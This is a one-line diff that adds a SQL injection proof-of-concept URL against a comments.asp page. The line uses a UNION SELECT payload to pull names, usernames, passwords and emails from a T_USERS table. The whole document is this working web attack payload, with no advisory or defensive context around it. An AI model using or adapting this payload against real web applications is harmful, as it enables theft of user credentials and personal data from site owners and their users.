@@ -1,0 +1,1 @@
+http://www.example.com/path/comments.asp?id=-1 UNION SELECT ID,uFULLNAME,uUSERNAME,uPASSWORD,uEMAIL,uDATECREATED,null,null FROM T_USERS WHERE id=1
